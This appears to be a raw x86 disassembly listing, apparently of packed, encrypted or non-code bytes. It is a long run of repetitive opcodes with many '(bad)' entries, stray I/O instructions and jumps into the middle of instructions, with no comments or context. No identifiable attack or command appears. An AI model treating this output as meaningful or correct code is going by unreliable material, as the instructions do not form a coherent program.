  404865:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  40486a:	c5 bc d1 a1 a0 eb 60 	lds    0x60eba0a1(%ecx,%edx,8),%edi
  404871:	5f                   	pop    %edi
  404872:	c5 b8 d1 a1 a0 eb    	lds    -0x145f5e2f(%eax),%edi
  404878:	60                   	pusha
  404879:	5f                   	pop    %edi
  40487a:	c5 b4 d1 a1 a0 eb 60 	lds    0x60eba0a1(%ecx,%edx,8),%esi
  404881:	5f                   	pop    %edi
  404882:	c5 b0 d1 a1 a0 eb    	lds    -0x145f5e2f(%eax),%esi
  404888:	60                   	pusha
  404889:	5f                   	pop    %edi
  40488a:	c5 ac d1 a1 a0 eb 60 	lds    0x60eba0a1(%ecx,%edx,8),%ebp
  404891:	5f                   	pop    %edi
  404892:	c5 a8 d1 a1 a0 eb    	lds    -0x145f5e2f(%eax),%ebp
  404898:	60                   	pusha
  404899:	5f                   	pop    %edi
  40489a:	c5 24 d1             	lds    (%ecx,%edx,8),%esp
  40489d:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  4048a2:	c5 20                	lds    (%eax),%esp
  4048a4:	d1 a1 a0 eb 60 b5    	shll   $1,-0x4a9f1460(%ecx)
  4048aa:	2b 4c 2b a5          	sub    -0x5b(%ebx,%ebp,1),%ecx
  4048ae:	b0 b0                	mov    $0xb0,%al
  4048b0:	23 dd                	and    %ebp,%ebx
  4048b2:	ac                   	lods   %ds:(%esi),%al
  4048b3:	61                   	popa
  4048b4:	bb 20 e0 e3 80       	mov    $0x80e3e020,%ebx
  4048b9:	df f0                	fcomip %st(0),%st
  4048bb:	eb e5                	jmp    0x4048a2
  4048bd:	68 f0 48 7d 5f       	push   $0x5f7d48f0
  4048c2:	9f                   	lahf
  4048c3:	5f                   	pop    %edi
  4048c4:	fd                   	std
  4048c5:	22 ac 60 30 5f c5 1c 	and    0x1cc55f30(%eax,%eiz,2),%ch
  4048cc:	d1 a1 a0 eb 60 5f    	shll   $1,0x5f60eba0(%ecx)
  4048d2:	c5 18                	lds    (%eax),%ebx
  4048d4:	d1 a1 a0 eb 60 5f    	shll   $1,0x5f60eba0(%ecx)
  4048da:	c5 14 d1             	lds    (%ecx,%edx,8),%edx
  4048dd:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  4048e2:	c5 10                	lds    (%eax),%edx
  4048e4:	d1 a1 a0 eb 60 5f    	shll   $1,0x5f60eba0(%ecx)
  4048ea:	c5 0c d1             	lds    (%ecx,%edx,8),%ecx
  4048ed:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  4048f2:	c5 08                	lds    (%eax),%ecx
  4048f4:	d1 a1 a0 eb 60 5f    	shll   $1,0x5f60eba0(%ecx)
  4048fa:	c5 04 d1             	lds    (%ecx,%edx,8),%eax
  4048fd:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  404902:	c5 00                	lds    (%eax),%eax
  404904:	d1 a1 a0 eb 60 5f    	shll   $1,0x5f60eba0(%ecx)
  40490a:	c5 fc d1             	(bad)
  40490d:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  404912:	c5 f8 d1             	(bad)
  404915:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  40491a:	c5 f4 d1             	(bad)
  40491d:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  404922:	c5 f0 d1             	(bad)
  404925:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  40492a:	c5 ec d1             	(bad)
  40492d:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  404932:	c5 e8 d1             	(bad)
  404935:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  40493a:	c5 e4 d1             	(bad)
  40493d:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  404942:	c5 e0 d1             	(bad)
  404945:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  40494a:	c5 dc d1             	(bad)
  40494d:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  404952:	c5 d8 d1             	(bad)
  404955:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  40495a:	c5 d4 d1             	(bad)
  40495d:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  404962:	c5 d0 d1             	(bad)
  404965:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  40496a:	c5 cc d1             	(bad)
  40496d:	a1 a0 eb 60 b5       	mov    0xb560eba0,%eax
  404972:	2b 4c d3 20          	sub    0x20(%ebx,%edx,8),%ecx
  404976:	f5                   	cmc
  404977:	c8 ad 95 e0          	enter  $0x95ad,$0xe0
  40497b:	60                   	pusha
  40497c:	04 5f                	add    $0x5f,%al
  40497e:	d0 c4                	rol    $1,%ah
  404980:	29 80 9f 65 28 16    	sub    %eax,0x1628659f(%eax)
  404986:	e0 60                	loopne 0x4049e8
  404988:	d3 20                	shll   %cl,(%eax)
  40498a:	fa                   	cli
  40498b:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  404990:	08 74 d5 a0          	or     %dh,-0x60(%ebp,%edx,8)
  404994:	a0 23 89 82 8b       	mov    0x8b828923,%al
  404999:	5f                   	pop    %edi
  40499a:	9f                   	lahf
  40499b:	4b                   	dec    %ebx
  40499c:	98                   	cwtl
  40499d:	bd 63 eb 60 e3       	mov    $0xe360eb63,%ebp
  4049a2:	cd e8                	int    $0xe8
  4049a4:	56                   	push   %esi
  4049a5:	a0 a0 61 63 84       	mov    0x846361a0,%al
  4049aa:	d5 a0                	aad    $0xa0
  4049ac:	a0 71 a2 8e d2       	mov    0xd28ea271,%al
  4049b1:	64 a0 60 a0 60 b0    	mov    %fs:0xb060a060,%al
  4049b7:	a0 a0 a8 a0 60       	mov    0x60a0a8a0,%al
  4049bc:	a0 60 b0 a0 a0       	mov    0xa0a0b060,%al
  4049c1:	6b 0c c4 0e          	imul   $0xe,(%esp,%eax,8),%ecx
  4049c5:	b3 14                	mov    $0x14,%bl
  4049c7:	d2 f5                	shl    %cl,%ch
  4049c9:	d4 09                	aam    $0x9
  4049cb:	cc                   	int3
  4049cc:	13 f0                	adc    %eax,%esi
  4049ce:	d5 a0                	aad    $0xa0
  4049d0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4049d5:	60                   	pusha
  4049d6:	a0 60 a0 f0 d5       	mov    0xd5f0a060,%al
  4049db:	a0 a0 60 a0 60       	mov    0x60a060a0,%al
  4049e0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4049e5:	60                   	pusha
  4049e6:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4049eb:	60                   	pusha
  4049ec:	a0 02 d5 a0 a0       	mov    0xa0a0d502,%al
  4049f1:	68 a0 60 a0 6c       	push   $0x6ca060a0
  4049f6:	b0 a0                	mov    $0xa0,%al
  4049f8:	a0 c4 bd a0 a0       	mov    0xa0a0bdc4,%al
  4049fd:	d0 bd a0 a0 d4 bd    	sarb   $1,-0x422b5f60(%ebp)
  404a03:	a0 a0 d8 bd a0       	mov    0xa0bdd8a0,%al
  404a08:	a0 cc bd a0 a0       	mov    0xa0a0bdcc,%al
  404a0d:	a8 bc                	test   $0xbc,%al
  404a0f:	a0 a0 c4 bc a0       	mov    0xa0bcc4a0,%al
  404a14:	a0 00 bc a0 a0       	mov    0xa0a0bc00,%al
  404a19:	6e                   	outsb  %ds:(%esi),(%dx)
  404a1a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  404a1f:	61                   	popa
  404a20:	a0 60 a0 80 d5       	mov    0xd580a060,%al
  404a25:	a0 a0 64 a0 60       	mov    0x60a064a0,%al
  404a2a:	a0 68 f4 b3 14       	mov    0x14b3f468,%al
  404a2f:	d2 ec                	shr    %cl,%ah
  404a31:	c9                   	leave
  404a32:	13 d4                	adc    %esp,%edx
  404a34:	30 b3 f6 e4 72 d4    	xor    %dh,-0x2b8d1b0a(%ebx)
  404a3a:	a8 e3                	test   $0xe3,%al
  404a3c:	64 50                	fs push %eax
  404a3e:	88 46 87             	mov    %al,-0x79(%esi)
  404a41:	5f                   	pop    %edi
  404a42:	9f                   	lahf
  404a43:	eb 7a                	jmp    0x404abf
  404a45:	eb 90                	jmp    0x4049d7
  404a47:	93                   	xchg   %eax,%ebx
  404a48:	72 eb                	jb     0x404a35
  404a4a:	66 48                	dec    %ax
  404a4c:	59                   	pop    %ecx
  404a4d:	46                   	inc    %esi
  404a4e:	9f                   	lahf
  404a4f:	5f                   	pop    %edi
  404a50:	2b 26                	sub    (%esi),%esp
  404a52:	24 3b                	and    $0x3b,%al
  404a54:	14 6f                	adc    $0x6f,%al
  404a56:	88 86 88 5f 9f c4    	mov    %al,-0x3b60a078(%esi)
  404a5c:	2f                   	das
  404a5d:	65 a0 60 a0 60 23    	mov    %gs:0x2360a060,%al
  404a63:	24 ac                	and    $0xac,%al
  404a65:	eb 66                	jmp    0x404acd
  404a67:	be fb 23 2d a0       	mov    $0xa02d23fb,%esi
  404a6c:	a0 b5 2b 4c 23       	mov    0x234c2bb5,%al
  404a71:	24 98                	and    $0x98,%al
  404a73:	b3 f6                	mov    $0xf6,%bl
  404a75:	b7 d3                	mov    $0xd3,%bh
  404a77:	29 29                	sub    %ebp,(%ecx)
  404a79:	ad                   	lods   %ds:(%esi),%eax
  404a7a:	98                   	cwtl
  404a7b:	e9 f5 5c 2b 58       	jmp    0x586ba775
  404a80:	d3 20                	shll   %cl,(%eax)
  404a82:	f5                   	cmc
  404a83:	c8 13 96 e0          	enter  $0x9613,$0xe0
  404a87:	60                   	pusha
  404a88:	04 5f                	add    $0x5f,%al
  404a8a:	d0 c4                	rol    $1,%ah
  404a8c:	29 80 2b a7 a4 48    	sub    %eax,0x48a4a72b(%eax)
  404a92:	27                   	daa
  404a93:	58                   	pop    %eax
  404a94:	9f                   	lahf
  404a95:	5f                   	pop    %edi
  404a96:	2b 38                	sub    (%eax),%edi
  404a98:	eb e5                	jmp    0x404a7f
  404a9a:	7b dc                	jnp    0x404a78
  404a9c:	c2 a3 d3             	ret    $0xd3a3
  404a9f:	56                   	push   %esi
  404aa0:	9f                   	lahf
  404aa1:	d5 98                	aad    $0x98
  404aa3:	eb e7                	jmp    0x404a8c
  404aa5:	64 9f                	fs lahf
  404aa7:	94                   	xchg   %eax,%esp
  404aa8:	50                   	push   %eax
  404aa9:	c8 2c 96 e0          	enter  $0x962c,$0xe0
  404aad:	60                   	pusha
  404aae:	2d a5 98 1a a3       	sub    $0xa31a98a5,%eax
  404ab3:	60                   	pusha
  404ab4:	a0 60 88 5e 90       	mov    0x905e8860,%al
  404ab9:	5f                   	pop    %edi
  404aba:	9f                   	lahf
  404abb:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404abc:	eb d5                	jmp    0x404a93
  404abe:	81 ed e5 58 f0 eb    	sub    $0xebf058e5,%ebp
  404ac4:	e5 58                	in     $0x58,%eax
  404ac6:	88 8e 90 5f 9f eb    	mov    %cl,-0x1460a070(%esi)
  404acc:	68 a9 5a 61 a0       	push   $0xa0615aa9
  404ad1:	60                   	pusha
  404ad2:	a0 eb e5 58 88       	mov    0x8858e5eb,%al
  404ad7:	d2 92 5f 9f eb e5    	rclb   %cl,-0x1a1460a1(%edx)
  404add:	5c                   	pop    %esp
  404ade:	2b b5 98 48 87 4e    	sub    0x4e874898(%ebp),%esi
  404ae4:	9f                   	lahf
  404ae5:	5f                   	pop    %edi
  404ae6:	d3 20                	shll   %cl,(%eax)
  404ae8:	fa                   	cli
  404ae9:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  404aee:	08 da                	or     %bl,%dl
  404af0:	d6                   	salc
  404af1:	a0 a0 ed e5 58       	mov    0x58e5eda0,%al
  404af6:	88 de                	mov    %bl,%dh
  404af8:	8e 5f 9f             	mov    -0x61(%edi),%ds
  404afb:	23 89 1c 89 5f 9f    	and    -0x60a076e4(%ecx),%ecx
  404b01:	4b                   	dec    %ebx
  404b02:	90                   	nop
  404b03:	bf fe bb f9 b9       	mov    $0xb9f9bbfe,%edi
  404b08:	fd                   	std
  404b09:	23 a0 60 a0 5f 9f    	and    -0x60a05fa0(%eax),%esp
  404b0f:	5f                   	pop    %edi
  404b10:	9f                   	lahf
  404b11:	62 a0 60 a0 6d aa    	bound  %esp,-0x55925fa0(%eax)
  404b17:	60                   	pusha
  404b18:	a0 b5 2b 4c 0a       	mov    0xa4c2bb5,%al
  404b1d:	60                   	pusha
  404b1e:	0a 60 f3             	or     -0xd(%eax),%ah
  404b21:	b6 2b                	mov    $0x2b,%dh
  404b23:	3a 2b                	cmp    (%ebx),%ch
  404b25:	50                   	push   %eax
  404b26:	d3 20                	shll   %cl,(%eax)
  404b28:	f5                   	cmc
  404b29:	c8 ce 97 e0          	enter  $0x97ce,$0xe0
  404b2d:	60                   	pusha
  404b2e:	04 5f                	add    $0x5f,%al
  404b30:	d0 c4                	rol    $1,%ah
  404b32:	29 80 2b 26 88 26    	sub    %eax,0x2688262b(%eax)
  404b38:	a1 60 a0 e5 7b       	mov    0x7be5a060,%eax
  404b3d:	d4 fd                	aam    $0xfd
  404b3f:	ed                   	in     (%dx),%eax
  404b40:	e5 5c                	in     $0x5c,%eax
  404b42:	2b 33                	sub    (%ebx),%esi
  404b44:	88 28                	mov    %ch,(%eax)
  404b46:	8e 5f 9f             	mov    -0x61(%edi),%ds
  404b49:	eb f5                	jmp    0x404b40
  404b4b:	5c                   	pop    %esp
  404b4c:	58                   	pop    %eax
  404b4d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404b4e:	d7                   	xlat   %ds:(%ebx)
  404b4f:	a0 a0 48 1f 52       	mov    0x521f48a0,%al
  404b54:	9f                   	lahf
  404b55:	5f                   	pop    %edi
  404b56:	2b 38                	sub    (%eax),%edi
  404b58:	25 3b 14 87 2d       	and    $0x2d87143b,%eax
  404b5d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404b5e:	98                   	cwtl
  404b5f:	b0 2b                	mov    $0x2b,%al
  404b61:	2b e9                	sub    %ecx,%ebp
  404b63:	93                   	xchg   %eax,%ebx
  404b64:	72 eb                	jb     0x404b51
  404b66:	e5 5c                	in     $0x5c,%eax
  404b68:	88 40 91             	mov    %al,-0x6f(%eax)
  404b6b:	5f                   	pop    %edi
  404b6c:	9f                   	lahf
  404b6d:	ed                   	in     (%dx),%eax
  404b6e:	e5 5c                	in     $0x5c,%eax
  404b70:	f0 ed                	lock in (%dx),%eax
  404b72:	f3 62 59 5f          	repz bound %ebx,0x5f(%ecx)
  404b76:	9f                   	lahf
  404b77:	5f                   	pop    %edi
  404b78:	1f                   	pop    %ds
  404b79:	eb e5                	jmp    0x404b60
  404b7b:	5c                   	pop    %esp
  404b7c:	88 2c 91             	mov    %ch,(%ecx,%edx,4)
  404b7f:	5f                   	pop    %edi
  404b80:	9f                   	lahf
  404b81:	4b                   	dec    %ebx
  404b82:	ab                   	stos   %eax,%es:(%edi)
  404b83:	ed                   	in     (%dx),%eax
  404b84:	e5 58                	in     $0x58,%eax
  404b86:	2b b5 9c 48 23 4e    	sub    0x4e23489c(%ebp),%esi
  404b8c:	9f                   	lahf
  404b8d:	5f                   	pop    %edi
  404b8e:	2b b5 98 eb 66 48    	sub    0x4866eb98(%ebp),%esi
  404b94:	c9                   	leave
  404b95:	61                   	popa
  404b96:	a0 60 25 3b 15       	mov    0x153b2560,%al
  404b9b:	0d d3 20 fa b9       	or     $0xb9fa20d3,%eax
  404ba0:	f9                   	stc
  404ba1:	c4 29                	les    (%ecx),%ebp
  404ba3:	70 08                	jo     0x404bad
  404ba5:	95                   	xchg   %eax,%ebp
  404ba6:	d7                   	xlat   %ds:(%ebx)
  404ba7:	a0 a0 ed e5 58       	mov    0x58e5eda0,%al
  404bac:	5a                   	pop    %edx
  404bad:	62 a0 60 a0 48 87    	bound  %esp,-0x78b75fa0(%eax)
  404bb3:	4d                   	dec    %ebp
  404bb4:	9f                   	lahf
  404bb5:	5f                   	pop    %edi
  404bb6:	63 49 a1             	arpl   %ecx,-0x5f(%ecx)
  404bb9:	49                   	dec    %ecx
  404bba:	9f                   	lahf
  404bbb:	5f                   	pop    %edi
  404bbc:	8b 4b fe             	mov    -0x2(%ebx),%ecx
  404bbf:	bb f9 b9 fd 23       	mov    $0x23fdb9f9,%ebx
  404bc4:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  404bc9:	62 a0 60 a0 6d aa    	bound  %esp,-0x55925fa0(%eax)
  404bcf:	60                   	pusha
  404bd0:	a0 eb e0 64 88       	mov    0x8864e0eb,%al
  404bd5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404bd6:	97                   	xchg   %eax,%edi
  404bd7:	5f                   	pop    %edi
  404bd8:	9f                   	lahf
  404bd9:	23 2d a0 a0 b5 2b    	and    0x2bb5a0a0,%ebp
  404bdf:	4c                   	dec    %esp
  404be0:	21 24 4c             	and    %esp,(%esp,%ecx,2)
  404be3:	5e                   	pop    %esi
  404be4:	9f                   	lahf
  404be5:	5f                   	pop    %edi
  404be6:	f3 93                	repz xchg %eax,%ebx
  404be8:	69 e9 2d 0c 9e 5f    	imul   $0x5f9e0c2d,%ecx,%ebp
  404bee:	9f                   	lahf
  404bef:	e9 ed 5c 2b 38       	jmp    0x386ba8e1
  404bf4:	d3 20                	shll   %cl,(%eax)
  404bf6:	f5                   	cmc
  404bf7:	c8 c9 98 e0          	enter  $0x98c9,$0xe0
  404bfb:	60                   	pusha
  404bfc:	04 5f                	add    $0x5f,%al
  404bfe:	d0 c4                	rol    $1,%ah
  404c00:	29 80 2d e5 50 5e    	sub    %eax,0x5e50e52d(%eax)
  404c06:	9f                   	lahf
  404c07:	5f                   	pop    %edi
  404c08:	88 b4 80 5f 9f 93 60 	mov    %dh,0x60939f5f(%eax,%eax,4)
  404c0f:	b5 08                	mov    $0x8,%ch
  404c11:	61                   	popa
  404c12:	d8 a0 a0 c4 9f 90    	fsubs  -0x6f603b60(%eax)
  404c18:	04 e9                	add    $0xe9,%al
  404c1a:	c0 01 e0             	rolb   $0xe0,(%ecx)
  404c1d:	08 e0                	or     %ah,%al
  404c1f:	60                   	pusha
  404c20:	66 60                	pushaw
  404c22:	a1 1a a1 60 a0       	mov    0xa060a11a,%eax
  404c27:	60                   	pusha
  404c28:	2d e5 50 5e 9f       	sub    $0x9f5e50e5,%eax
  404c2d:	5f                   	pop    %edi
  404c2e:	88 12                	mov    %dl,(%edx)
  404c30:	83 5f 9f ed          	sbbl   $0xffffffed,-0x61(%edi)
  404c34:	35 0c 9e 5f 9f       	xor    $0x9f5f9e0c,%eax
  404c39:	eb 63                	jmp    0x404c9e
  404c3b:	48                   	dec    %eax
  404c3c:	cd 5e                	int    $0x5e
  404c3e:	9f                   	lahf
  404c3f:	5f                   	pop    %edi
  404c40:	2b e5                	sub    %ebp,%esp
  404c42:	4c                   	dec    %esp
  404c43:	5e                   	pop    %esi
  404c44:	9f                   	lahf
  404c45:	5f                   	pop    %edi
  404c46:	2d ad 9c 93 72       	sub    $0x72939cad,%eax
  404c4b:	48                   	dec    %eax
  404c4c:	9d                   	popf
  404c4d:	60                   	pusha
  404c4e:	a0 60 0a 60 2b       	mov    0x2b600a60,%al
  404c53:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404c54:	9c                   	pushf
  404c55:	48                   	dec    %eax
  404c56:	3f                   	aas
  404c57:	4e                   	dec    %esi
  404c58:	9f                   	lahf
  404c59:	5f                   	pop    %edi
  404c5a:	f0 ed                	lock in (%dx),%eax
  404c5c:	e5 5c                	in     $0x5c,%eax
  404c5e:	88 42 90             	mov    %al,-0x70(%edx)
  404c61:	5f                   	pop    %edi
  404c62:	9f                   	lahf
  404c63:	eb 70                	jmp    0x404cd5
  404c65:	ed                   	in     (%dx),%eax
  404c66:	25 10 9e 5f 9f       	and    $0x9f5f9e10,%eax
  404c6b:	b9 88 74 81 5f       	mov    $0x5f817488,%ecx
  404c70:	9f                   	lahf
  404c71:	93                   	xchg   %eax,%ebx
  404c72:	60                   	pusha
  404c73:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  404c78:	b0 c8                	mov    $0xc8,%al
  404c7a:	a8 98                	test   $0x98,%al
  404c7c:	e0 60                	loopne 0x404cde
  404c7e:	2d e5 50 5e 9f       	sub    $0x9f5e50e5,%eax
  404c83:	5f                   	pop    %edi
  404c84:	88 7c 81 5f          	mov    %bh,0x5f(%ecx,%eax,4)
  404c88:	9f                   	lahf
  404c89:	23 89 8e 88 5f 9f    	and    -0x60a07772(%ecx),%ecx
  404c8f:	4b                   	dec    %ebx
  404c90:	8d 93 60 ba f9 b9    	lea    -0x460645a0(%ebx),%edx
  404c96:	04 e9                	add    $0xe9,%al
  404c98:	b0 c8                	mov    $0xc8,%al
  404c9a:	d0 98 e0 60 2d e5    	rcrb   $1,-0x1ad29f20(%eax)
  404ca0:	4c                   	dec    %esp
  404ca1:	5e                   	pop    %esi
  404ca2:	9f                   	lahf
  404ca3:	5f                   	pop    %edi
  404ca4:	88 30                	mov    %dh,(%eax)
  404ca6:	8c 5f 9f             	mov    %ds,-0x61(%edi)
  404ca9:	ed                   	in     (%dx),%eax
  404caa:	e5 5c                	in     $0x5c,%eax
  404cac:	88 28                	mov    %ch,(%eax)
  404cae:	8c 5f 9f             	mov    %ds,-0x61(%edi)
  404cb1:	23 89 66 88 5f 9f    	and    -0x60a0779a(%ecx),%ecx
  404cb7:	4b                   	dec    %ebx
  404cb8:	85 bb 2b 45 fd 23    	test   %edi,0x23fd452b(%ebx)
  404cbe:	2d a0 a0 b3 f6       	sub    $0xf6b3a0a0,%eax
  404cc3:	eb 92                	jmp    0x404c57
  404cc5:	eb 78                	jmp    0x404d3f
  404cc7:	eb e3                	jmp    0x404cac
  404cc9:	64 88 ae 96 5f 9f a0 	mov    %ch,%fs:-0x5f60a06a(%esi)
  404cd0:	f0 ed                	lock in (%dx),%eax
  404cd2:	e3 64                	jecxz  0x404d38
  404cd4:	59                   	pop    %ecx
  404cd5:	61                   	popa
  404cd6:	a0 60 a0 eb b5       	mov    0xb5eba060,%al
  404cdb:	80 d5 a0             	adc    $0xa0,%ch
  404cde:	a0 48 95 57 9f       	mov    0x9f579548,%al
  404ce3:	5f                   	pop    %edi
  404ce4:	23 24 a4             	and    (%esp,%eiz,4),%esp
  404ce7:	eb e3                	jmp    0x404ccc
  404ce9:	64 88 96 96 5f 9f eb 	mov    %dl,%fs:-0x1460a06a(%esi)
  404cf0:	f3 64 2d 64 22 eb 76 	repz fs sub $0x76eb2264,%eax
  404cf7:	48                   	dec    %eax
  404cf8:	71 4c                	jno    0x404d46
  404cfa:	9f                   	lahf
  404cfb:	5f                   	pop    %edi
  404cfc:	fe                   	(bad)
  404cfd:	bb 63 eb 60 b3       	mov    $0xb360eb63,%ebx
  404d02:	2b 38                	sub    (%eax),%edi
  404d04:	0a 60 2d             	or     0x2d(%eax),%ah
  404d07:	a3 a4 19 a1 60       	mov    %eax,0x60a119a4
  404d0c:	a0 60 2b 75 c0       	mov    0xc0752b60,%al
  404d11:	95                   	xchg   %eax,%ebp
  404d12:	e0 60                	loopne 0x404d74
  404d14:	88 20                	mov    %ah,(%eax)
  404d16:	97                   	xchg   %eax,%edi
  404d17:	5f                   	pop    %edi
  404d18:	9f                   	lahf
  404d19:	e3 64                	jecxz  0x404d7f
  404d1b:	64 fb                	fs sti
  404d1d:	23 2d a0 a0 b3 f6    	and    0xf6b3a0a0,%ebp
  404d23:	b7 2b                	mov    $0x2b,%bh
  404d25:	59                   	pop    %ecx
  404d26:	2b 52 2b             	sub    0x2b(%edx),%edx
  404d29:	38 2b                	cmp    %ch,(%ebx)
  404d2b:	27                   	daa
  404d2c:	88 a8 8c 5f 9f eb    	mov    %ch,-0x1460a074(%eax)
  404d32:	63 48 39             	arpl   %ecx,0x39(%eax)
  404d35:	5e                   	pop    %esi
  404d36:	9f                   	lahf
  404d37:	5f                   	pop    %edi
  404d38:	db 50 1d             	fistl  0x1d(%eax)
  404d3b:	6d                   	insl   (%dx),%es:(%edi)
  404d3c:	2b 27                	sub    (%edi),%esp
  404d3e:	2b b3 a4 eb b4 12    	sub    0x12b4eba4(%ebx),%esi
  404d44:	88 e4                	mov    %ah,%ah
  404d46:	8c 5f 9f             	mov    %ds,-0x61(%edi)
  404d49:	bf fe bb 63 b5       	mov    $0xb563bbfe,%edi
  404d4e:	2b 4c 23 24          	sub    0x24(%ebx,%eiz,1),%ecx
  404d52:	94                   	xchg   %eax,%esp
  404d53:	b3 f6                	mov    $0xf6,%bl
  404d55:	b7 d3                	mov    $0xd3,%bh
  404d57:	3b 29                	cmp    (%ecx),%ebp
  404d59:	bd 94 e9 ed 58       	mov    $0x58ede994,%ebp
  404d5e:	28 b5 9f eb 98 93    	sub    %dh,-0x6c671461(%ebp)
  404d64:	60                   	pusha
  404d65:	b5 08                	mov    $0x8,%ch
  404d67:	c0 d9 a0             	rcr    $0xa0,%cl
  404d6a:	a0 c4 9f 90 04       	mov    0x4909fc4,%al
  404d6f:	e9 c0 eb 67 48       	jmp    0x48a83934
  404d74:	21 4d 9f             	and    %ecx,-0x61(%ebp)
  404d77:	5f                   	pop    %edi
  404d78:	2b 50 5b             	sub    0x5b(%eax),%edx
  404d7b:	61                   	popa
  404d7c:	a0 60 a0 4b a1       	mov    0xa14ba060,%al
  404d81:	a3 db 53 1c 67       	mov    %eax,0x671c53db
  404d86:	20 dc                	and    %bl,%ah
  404d88:	bf 5f c0 d6 94       	mov    $0x94d6c05f,%edi
  404d8d:	9b                   	fwait
  404d8e:	93                   	xchg   %eax,%ebx
  404d8f:	dd ab eb e5 58 88    	(bad) -0x77a71a15(%ebx)
  404d95:	40                   	inc    %eax
  404d96:	8b 5f 9f             	mov    -0x61(%edi),%ebx
  404d99:	4b                   	dec    %ebx
  404d9a:	ba ae 20 dc d7       	mov    $0xd7dc20ae,%edx
  404d9f:	5f                   	pop    %edi
  404da0:	c0 d6 98             	rcl    $0x98,%dh
  404da3:	eb e5                	jmp    0x404d8a
  404da5:	58                   	pop    %eax
  404da6:	f0 eb 6e             	lock jmp 0x404e17
  404da9:	8b 6b a1             	mov    -0x5f(%ebx),%ebp
  404dac:	2b 33                	sub    (%ebx),%esi
  404dae:	2b 27                	sub    (%edi),%esp
  404db0:	88 f8                	mov    %bh,%al
  404db2:	8f                   	(bad)
  404db3:	5f                   	pop    %edi
  404db4:	9f                   	lahf
  404db5:	e0 1d                	loopne 0x404dd4
  404db7:	5f                   	pop    %edi
  404db8:	a0 d4 b8 ed f5       	mov    0xf5edb8d4,%al
  404dbd:	54                   	push   %esp
  404dbe:	2b a5 98 eb a0 48    	sub    0x48a0eb98(%ebp),%esp
  404dc4:	d1 60 a0             	shll   $1,-0x60(%eax)
  404dc7:	60                   	pusha
  404dc8:	2b b5 94 eb e5 58    	sub    0x58e5eb94(%ebp),%esi
  404dce:	88 5a 8b             	mov    %bl,-0x75(%edx)
  404dd1:	5f                   	pop    %edi
  404dd2:	9f                   	lahf
  404dd3:	93                   	xchg   %eax,%ebx
  404dd4:	60                   	pusha
  404dd5:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  404dda:	b0 c8                	mov    $0xc8,%al
  404ddc:	07                   	pop    %es
  404ddd:	99                   	cltd
  404dde:	e0 60                	loopne 0x404e40
  404de0:	2d a5 94 48 31       	sub    $0x314894a5,%eax
  404de5:	4b                   	dec    %ebx
  404de6:	9f                   	lahf
  404de7:	5f                   	pop    %edi
  404de8:	63 49 6f             	arpl   %ecx,0x6f(%ecx)
  404deb:	46                   	inc    %esi
  404dec:	9f                   	lahf
  404ded:	5f                   	pop    %edi
  404dee:	8b 50 ff             	mov    -0x1(%eax),%edx
  404df1:	be fb eb 85 bd       	mov    $0xbd85ebfb,%esi
  404df6:	63 eb                	arpl   %ebp,%ebx
  404df8:	60                   	pusha
  404df9:	b5 2b                	mov    $0x2b,%ch
  404dfb:	4c                   	dec    %esp
  404dfc:	23 24 90             	and    (%eax,%edx,4),%esp
  404dff:	b3 f6                	mov    $0xf6,%bl
  404e01:	b7 d3                	mov    $0xd3,%bh
  404e03:	29 29                	sub    %ebp,(%ecx)
  404e05:	ad                   	lods   %ds:(%esi),%eax
  404e06:	90                   	nop
  404e07:	e9 ed 54 29 b5       	jmp    0xb569a2f9
  404e0c:	9c                   	pushf
  404e0d:	eb 90                	jmp    0x404d9f
  404e0f:	93                   	xchg   %eax,%ebx
  404e10:	60                   	pusha
  404e11:	b5 08                	mov    $0x8,%ch
  404e13:	85 da                	test   %ebx,%edx
  404e15:	a0 a0 c4 9f 90       	mov    0x909fc4a0,%al
  404e1a:	04 e9                	add    $0xe9,%al
  404e1c:	c0 eb e5             	shr    $0xe5,%bl
  404e1f:	5c                   	pop    %esp
  404e20:	88 b4 8b 5f 9f 26 e5 	mov    %dh,-0x1ad960a1(%ebx,%ecx,4)
  404e27:	5b                   	pop    %ebx
  404e28:	a0 eb 66 48 69       	mov    0x694866eb,%al
  404e2d:	4c                   	dec    %esp
  404e2e:	9f                   	lahf
  404e2f:	5f                   	pop    %edi
  404e30:	2b 58 25             	sub    0x25(%eax),%ebx
  404e33:	5f                   	pop    %edi
  404e34:	1e                   	push   %ds
  404e35:	bd 5b 61 a0 60       	mov    $0x60a0615b,%ebp
  404e3a:	a0 e0 1d 5b a0       	mov    0xa05b1de0,%al
  404e3f:	d4 c3                	aam    $0xc3
  404e41:	e0 1c                	loopne 0x404e5f
  404e43:	7e 9f                	jle    0x404de4
  404e45:	80 14 96 2d          	adcb   $0x2d,(%esi,%edx,4)
  404e49:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404e4a:	94                   	xchg   %eax,%esp
